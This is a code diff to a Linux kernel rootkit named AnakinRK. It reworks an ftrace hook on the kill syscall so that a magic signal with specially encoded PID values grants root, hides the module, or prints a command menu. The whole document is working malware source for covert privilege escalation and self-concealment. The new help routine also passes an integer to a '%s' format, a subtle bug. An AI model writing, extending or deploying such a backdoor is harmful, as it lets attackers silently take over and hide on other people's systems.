@@ -4,21 +4,30 @@
 #include <linux/syscalls.h>
 #include <linux/cred.h>
 #include <linux/list.h>
+#include <linux/errno.h>
+#include <linux/string.h>
 #include "ftrace_helper.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("hoWo");
-MODULE_DESCRIPTION("Simple sys_kill and sys hook using ftrace");
-
-// MACROS
-#define GET_ROOT_SIG 66
-#define TOGGLE_RK_VIEW 65
-
-#define MAGIC_PID 1337
+MODULE_DESCRIPTION("Simple sys_kill hook using ftrace");
 
 // PROTOTYPES
 void getRoot(void);
 void toggleRkView(void);
+void helpMenu(void);
+
+// MACROS
+#define MAGIC_SIG 67
+
+#define GET_ROOT 0x726f6f74
+#define SELFHIDE 0x68696465
+#define GET_HELP 0x68656c70
+
+#define PIDTABLE \
+	X(GET_ROOT, MAGIC_SIG, getRoot(), "Get Root", -ESRCH) \
+	X(SELFHIDE, MAGIC_SIG, toggleRkView(), "Toggle hide", -ESRCH) \
+	X(GET_HELP, MAGIC_SIG, helpMenu(), "Help Menu", -EACCES) \
 
 // HOOKS
 static asmlinkage long (*orig_kill)(const struct pt_regs *);
@@ -26,15 +35,13 @@ static asmlinkage long hook_kill(const struct pt_regs *regs) {
     long sig = regs->si;
     long pid = regs->di;
 
-    if (pid == MAGIC_PID) {
-        switch (sig) {
-            case GET_ROOT_SIG:
-                getRoot();
-                return 0;
-
-            case TOGGLE_RK_VIEW:
-                toggleRkView();
-                return 0;
+    if (sig == MAGIC_SIG) {
+        switch ((int)pid) {
+            #define X(cmd, magic, func, desc, err) case cmd: \
+				func; \
+				return err;
+			PIDTABLE
+			#undef X
 
         }
     }
@@ -117,3 +124,16 @@ void toggleRkView(void) {
 
     }
 }
+
+void helpMenu(void) {
+	printk(KERN_DEBUG "============ AnakinRK Helping ============\n");
+	printk(KERN_DEBUG "=\tCommand (PID)\tSignal\tDescription\t=\n");
+	printk(KERN_DEBUG "==========================================\n");
+
+	#define X(cmd, magic, func, desc, err) printk(KERN_DEBUG "=\t%s\t%d\t%s\t=\n", cmd, magic, desc);
+	PIDTABLE
+	#undef X
+
+	printk(KERN_DEBUG "==========================================\n");
+
+};
